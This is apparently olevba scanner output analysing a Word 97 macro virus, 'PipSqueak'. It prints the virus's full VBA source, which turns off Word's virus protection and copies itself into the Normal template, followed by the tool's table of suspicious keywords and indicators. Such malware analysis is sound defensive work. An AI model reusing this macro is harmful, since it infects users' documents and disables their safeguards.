olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pip.b-fb6b8a5d53b96a06fce027923898fbce9e2c97f5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pip.b-fb6b8a5d53b96a06fce027923898fbce9e2c97f5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO squeak.bas 
in file: Virus.MSWord.Pip.b-fb6b8a5d53b96a06fce027923898fbce9e2c97f5 - OLE stream: 'Macros/VBA/squeak'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.VirusProtection = False
Set norm = NormalTemplate.VBProject.VBComponents: Set doc = ActiveDocument.VBProject.VBComponents
If norm.Item("squeak").Name <> "squeak" Then
  doc("squeak").Export "c:\squeak.dll"
  norm.Import ("c:\squeak.dll")
ElseIf doc.Item("squeak").Name <> "squeak" Then
  norm("squeak").Export "c:\squeak.dll"
  doc.Import ("c:\squeak.dll")
End If
If Day(Now) = 10 Then MsgBox "I would like you to meet WM97.PipSqueak", 0, "PipSqueak"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |squeak.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

